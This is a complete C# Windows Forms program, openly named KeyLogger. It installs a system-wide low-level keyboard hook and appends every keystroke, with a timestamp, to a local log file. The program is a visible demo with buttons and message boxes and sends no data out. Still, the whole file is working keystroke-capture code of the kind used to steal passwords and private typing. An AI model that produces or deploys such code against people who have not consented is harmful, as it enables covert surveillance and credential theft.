using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        MyListener listener;
        public Form1()
        {
            InitializeComponent();
            listener = new MyListener();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listener.SetHook();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            listener.UnsetHook();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            listener.UnsetHook();
            MessageBox.Show("Hook Is Unset");
        }
    }

    class MyListener
    {
        public MyListener()
        {
            funcHook = KeyboardHookCallback;
        }


        const int WH_KEYBOARD_LL = 13;

        const int WM_KEYDOWN = 0x0100;

        IntPtr hookPtr = IntPtr.Zero;

        KeyboardHookDelegate funcHook;

        delegate IntPtr KeyboardHookDelegate(int code, IntPtr wParam, IntPtr lParam);

        FileStream file;
        string filename = "log.txt";


        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int hookId, KeyboardHookDelegate del, IntPtr hmod, uint idThread);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr pHook);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr pHook, int code, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        IntPtr SetHookEx(KeyboardHookDelegate func)
        {

            Process currentProcess = Process.GetCurrentProcess();
            if (currentProcess == null) { MessageBox.Show("Process Is Invalid"); }

            ProcessModule currentModule = currentProcess.MainModule;
            if (currentModule == null) { MessageBox.Show("Module Is Invalid"); }

            string nameModule = currentModule.ModuleName;

            return SetWindowsHookEx(WH_KEYBOARD_LL, funcHook, GetModuleHandle(nameModule), 0);
        }
        public void SetHook()
        {
            hookPtr = SetHookEx(funcHook);
            if (hookPtr == IntPtr.Zero) MessageBox.Show("Hook Is Not Set");
            else MessageBox.Show("Hook Is Set");
        }

        public void UnsetHook()
        {
            UnhookWindowsHookEx(hookPtr);
        }

        IntPtr KeyboardHookCallback(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int keyCode = Marshal.ReadInt32(lParam);
                if (!File.Exists(filename))
                {
                    FileStream file = File.Create(filename);
                    file.Close();
                }
                StreamWriter writer = new StreamWriter(filename, append: true);
                writer.Write(DateTime.Now.ToShortTimeString() + " : ");
                switch (keyCode)
                {
                    case (int)Keys.Q: writer.WriteLine("Q"); break;
                    case (int)Keys.W: writer.WriteLine("W"); break;
                    case (int)Keys.E: writer.WriteLine("E"); break;
                    case (int)Keys.R: writer.WriteLine("R"); break;
                    case (int)Keys.T: writer.WriteLine("T"); break;
                    case (int)Keys.Y: writer.WriteLine("Y"); break;
                    case (int)Keys.U: writer.WriteLine("U"); break;
                    case (int)Keys.I: writer.WriteLine("I"); break;
                    case (int)Keys.O: writer.WriteLine("O"); break;
                    case (int)Keys.P: writer.WriteLine("P"); break;
                    case (int)Keys.A: writer.WriteLine("A"); break;
                    case (int)Keys.S: writer.WriteLine("S"); break;
                    case (int)Keys.D: writer.WriteLine("D"); break;
                    case (int)Keys.F: writer.WriteLine("F"); break;
                    case (int)Keys.G: writer.WriteLine("G"); break;
                    case (int)Keys.H: writer.WriteLine("H"); break;
                    case (int)Keys.J: writer.WriteLine("J"); break;
                    case (int)Keys.K: writer.WriteLine("K"); break;
                    case (int)Keys.L: writer.WriteLine("L"); break;
                    case (int)Keys.Z: writer.WriteLine("Z"); break;
                    case (int)Keys.X: writer.WriteLine("X"); break;
                    case (int)Keys.C: writer.WriteLine("C"); break;
                    case (int)Keys.V: writer.WriteLine("V"); break;
                    case (int)Keys.B: writer.WriteLine("B"); break;
                    case (int)Keys.N: writer.WriteLine("N"); break;
                    case (int)Keys.M: writer.WriteLine("M"); break;
                    case (int)Keys.LShiftKey: writer.WriteLine("Left Shift"); break;
                    case (int)Keys.RShiftKey: writer.WriteLine("Right Shift"); break;
                    case (int)Keys.Tab: writer.WriteLine("Tab"); break;
                    case (int)Keys.CapsLock: writer.WriteLine("CapsLock"); break;
                    case (int)Keys.D0: writer.WriteLine("0"); break;
                    case (int)Keys.D1: writer.WriteLine("1"); break;
                    case (int)Keys.D2: writer.WriteLine("2"); break;
                    case (int)Keys.D3: writer.WriteLine("3"); break;
                    case (int)Keys.D4: writer.WriteLine("4"); break;
                    case (int)Keys.D5: writer.WriteLine("5"); break;
                    case (int)Keys.D6: writer.WriteLine("6"); break;
                    case (int)Keys.D7: writer.WriteLine("7"); break;
                    case (int)Keys.D8: writer.WriteLine("8"); break;
                    case (int)Keys.D9: writer.WriteLine("9"); break;
                    case (int)Keys.Enter: writer.WriteLine("Enter"); break;
                    case (int)Keys.F1: writer.WriteLine("F1"); break;
                    case (int)Keys.F2: writer.WriteLine("F2"); break;
                    case (int)Keys.F3: writer.WriteLine("F3"); break;
                    case (int)Keys.F4: writer.WriteLine("F4"); break;
                    case (int)Keys.F5: writer.WriteLine("F5"); break;
                    case (int)Keys.F6: writer.WriteLine("F6"); break;
                    case (int)Keys.F7: writer.WriteLine("F7"); break;
                    case (int)Keys.F8: writer.WriteLine("F8"); break;
                    case (int)Keys.F9: writer.WriteLine("F9"); break;
                    case (int)Keys.F10: writer.WriteLine("F10"); break;
                    case (int)Keys.Oemplus: writer.WriteLine("+"); break;
                    case (int)Keys.OemMinus: writer.WriteLine("-"); break;
                    case (int)Keys.Back: writer.WriteLine("BackSpace"); break;
                    case (int)Keys.Escape: writer.WriteLine("Escape"); break;
                    case (int)Keys.Up: writer.WriteLine("Arrow Up"); break;
                    case (int)Keys.Down: writer.WriteLine("Arrow Down"); break;
                    case (int)Keys.Left: writer.WriteLine("Arrow Left"); break;
                    case (int)Keys.Right: writer.WriteLine("Arrow Right"); break;
                    case (int)Keys.Control: writer.WriteLine("CTRL"); break;
                    case (int)Keys.Alt: writer.WriteLine("Alt"); break;
                    case (int)Keys.Space: writer.WriteLine("Space"); break;
                }
                writer.Close();
            }
            return CallNextHookEx(hookPtr, code, wParam, lParam);
        }
    }
    
}
